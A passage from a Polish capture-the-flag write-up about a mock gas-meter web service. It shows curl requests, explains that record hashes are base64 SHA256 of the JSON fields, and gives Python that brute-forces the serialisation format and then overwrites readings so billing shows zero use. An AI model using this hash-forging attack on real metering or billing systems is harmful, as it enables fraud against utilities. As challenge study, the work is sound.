+</span></span><span style=display:flex><span>~/devp/tmp ❯ curl -ksi -X POST https://gas-challenge.herokuapp.com/counter -d <span style=color:#e6db74>&#39;{&#34;day&#34;:158,&#34;counter&#34;:4556,&#34;hash&#34;:&#34;PfKcgUq+0untCd1D4PPCTiuTpzRUddf3CrVj6llRJro=&#34;}&#39;</span> -H <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span>
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>400</span> Bad Request
+</span></span><span style=display:flex><span>Server: Cowboy
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>X-Powered-By: Express
+</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>21</span>
+</span></span><span style=display:flex><span>Etag: W/<span style=color:#e6db74>&#34;15-JLxC8zrLD+GxFN8bOq29RGyBkZ8&#34;</span>
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>08</span> Jun <span style=color:#ae81ff>2020</span> 08:15:28 GMT
+</span></span><span style=display:flex><span>Via: 1.1 vegur
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>invalid counter value%   
+</span></span></code></pre></div><p>Podsumowując:</p><ul><li>musimy wykonać POST</li><li>POST jest walidowany w kolejności: day, counter, hash</li><li>nie można podać wartości licznika mniejszego niż dzień poprzedni</li><li>nie możemy zmienić ostatniego (najnowszego) odczytu</li></ul><p>Czyli nie uda się &ldquo;wyzerować&rdquo; odczytów licznika dzień po dniu, ponieważ zawsze będzie najnowszy dzień o polu counter, którego nie da się zmienić.</p><h1 id=0x04-hash---jaki-hash>0x04 Hash - jaki hash?<a href=#0x04-hash---jaki-hash class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Każdy odczyt oprócz wartości i dnia posiada w JSONie zdefiniowane pole <code>hash</code> będące wartoścą 44 znakową. Po sprawdzeniu kilku kolejnych odczytów, nie jest trudne domyślić się, że to ciąg kodowany w base64. Próba jego zdekodowania kończy się jednak niepowodzeniem. Otrzymujemy ciąg bajtów spoza ASCII.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/devp/tmp ❯ echo -ne PfKcgUq+0untCd1D4PPCTiuTpzRUddf3CrVj6llRJro<span style=color:#f92672>=</span> | base64 -d
+</span></span><span style=display:flex><span><span style=color:#f92672>=</span>�J���  �C��N+��4Tu�
+</span></span><span style=display:flex><span>�c�YQ&amp;�%    
+</span></span></code></pre></div><p>Wykorzystując <code>CyberChef</code> <a href=https://gchq.github.io/CyberChef/>link</a> możemy sprawdzić co kryje się pod tymi bajtami.</p><p><img src=./cyberchef.png alt=CyberChef></p><p>Pierwszym i oczywistym <code>educated guess</code>, jest postawienie na SHA256, który w kodowaniu base64 ma długość właśnie 44 znaków (base64 wykorzystuje 6 bitów na znak, co przy 256 bitach i paddingu daje 44).</p><p>Należy teraz sprawdzić czy jest możliwość, aby samemu generować poprawny hash dla dowolnego zapytania. Na pierwszy rzut oka hash jest zależny od dnia/licznika. Te dwie wartości są w posiadaniu postronnego użytkownika sieci, który wykona zwykłe zapytanie <code>GET</code>. Oczywiście do shashowania wartości może być wykorzystywany jeszcze dowolny sekret. Poniższy kod może zostać w sposób trywialny dostosowany do takiej możliwości, jednak nie było takiej potrzeby. W związku z tym, że format JSON nie ma postaci kanonicznej (albo w chwili pisania tego writeupu autor nie jest o nim świadomy), skrypt wykorzystuje kilka logicznych formatów wejściowych dla funkcji hashującej. Są to pomysły zaczerpnięte z <a href=https://stackoverflow.com/questions/4670494/how-to-cryptographically-hash-a-json-object>tego</a> posta na StackOverflow.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>_SCHEMAS_ <span style=color:#f92672>=</span> [
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val, </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val , </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l1val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l2val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l1val, </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l2val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l1val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l2val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l1val ,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l2val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val, </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val , </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l1val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l2val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l1val, </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l2val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l1val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l2val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l1val ,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l2val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val, </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val , </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l1val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l2val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l1val, </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l2val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l1val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l2val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l1val ,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l2val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val, </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val , </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l2val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l1val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l2val, </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l1val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l2val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l1val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l2val ,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l1val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val, </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val , </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l2val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l1val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l2val, </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l1val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l2val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l1val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l2val ,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l1val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val, </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l2val , </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>:l1val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l2val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l1val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l2val, </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>: l1val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l2val,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l1val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>L2</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l2val ,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> L1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> : l1val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L1:l1val,L2:l2val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L1:l1val, L2:l2val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L1:l1val , L2:l2val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L1: l1val,L2: l2val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L1: l1val, L2: l2val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L1 : l1val,L2 : l2val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L1 : l1val , L2 : l2val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{L1:l1val,L2:l2val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{L1:l1val, L2:l2val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{L1:l1val , L2:l2val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{L1: l1val,L2: l2val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{L1: l1val, L2: l2val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{L1 : l1val,L2 : l2val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{L1 : l1val , L2 : l2val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ L1:l1val,L2:l2val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ L1:l1val, L2:l2val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ L1:l1val , L2:l2val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ L1: l1val,L2: l2val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ L1: l1val, L2: l2val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ L1 : l1val,L2 : l2val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ L1 : l1val , L2 : l2val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L2:l2val,L1:l1val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L2:l2val, L1:l1val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L2:l2val , L1:l1val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L2: l2val,L1: l1val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L2: l2val, L1: l1val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L2 : l2val,L1 : l1val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;L2 : l2val , L1 : l1val&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{L2:l2val,L1:l1val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{L2:l2val, L1:l1val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{L2:l2val , L1:l1val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{L2: l2val,L1: l1val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{L2: l2val, L1: l1val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{L2 : l2val,L1 : l1val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{L2 : l2val , L1 : l1val}&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ L2:l2val,L1:l1val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ L2:l2val, L1:l1val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ L2:l2val , L1:l1val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ L2: l2val,L1: l1val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ L2: l2val, L1: l1val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ L2 : l2val,L1 : l1val }&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;{ L2 : l2val , L1 : l1val }&#39;</span>,
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>brute</span>(counter, day, hsh):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> sc <span style=color:#f92672>in</span> _SCHEMAS_:
+</span></span><span style=display:flex><span>        chsh <span style=color:#f92672>=</span> calc_hash(counter, day, sc)
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>hsh<span style=color:#e6db74>}</span><span style=color:#e6db74> = </span><span style=color:#e6db74>{</span>chsh<span style=color:#e6db74>}</span><span style=color:#e6db74>?&#39;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> hsh <span style=color:#f92672>==</span> chsh:
+</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;[+] Found schema! :</span><span style=color:#e6db74>{</span>sc<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> sc
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>calc_hash</span>(counter, day, schema):
+</span></span><span style=display:flex><span>    <span style=color:#75715e># print(schema.replace(&#39;L1&#39;, &#39;counter&#39;).replace(&#39;l1val&#39;, str(counter)).replace(&#39;L2&#39;, &#39;day&#39;).replace(&#39;l2val&#39;, str(day)).encode(&#39;utf-8&#39;))</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> b64e(sha256sum(schema<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;L1&#39;</span>, <span style=color:#e6db74>&#39;counter&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;l1val&#39;</span>, str(counter))<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;L2&#39;</span>, <span style=color:#e6db74>&#39;day&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;l2val&#39;</span>, str(day))<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)))
+</span></span></code></pre></div><h1 id=0x05-zerujemy-licznik>0x05 Zerujemy! (licznik)<a href=#0x05-zerujemy-licznik class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Rzeczą oczywistą dla Czytelnika powinna być forma ataku. Skoro nie można wyzerować (patrz <code>0x03</code>) pomiarów należy zastosować inny trick. Jak obliczana jest należność za korzystanie z gazu? Zapewne od wartości końcowej w okresie rozliczenia odejmowana jest wartość z jego początku. Tym samym wyliczamy ilość zużytego gazu. Jeśli uda się sprawić aby pierwszy i ostatni pomiar były identyczne, to Jan Kowalski nie zapłaci ani grosza.</p><p>Wystarczy prosta pętla for oraz funkcje z listingu wyżej</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>solve</span>():
+</span></span><span style=display:flex><span>    c, txt <span style=color:#f92672>=</span> counter()
+</span></span><span style=display:flex><span>    txt <span style=color:#f92672>=</span> json<span style=color:#f92672>.</span>loads(txt)
+</span></span><span style=display:flex><span>    md_day <span style=color:#f92672>=</span> txt<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;day&#39;</span>, <span style=color:#66d9ef>None</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> md_day <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#39;[-] Cannot obtain the last day&#39;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;[+] </span><span style=color:#e6db74>{</span>txt<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>    md_hash <span style=color:#f92672>=</span> txt<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;hash&#39;</span>, <span style=color:#66d9ef>None</span>)
+</span></span><span style=display:flex><span>    md_counter <span style=color:#f92672>=</span> txt<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;counter&#39;</span>, <span style=color:#66d9ef>None</span>)
+</span></span><span style=display:flex><span>    schema <span style=color:#f92672>=</span> brute(md_counter, md_day, md_hash)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;[+] Overriding!&#39;</span>)
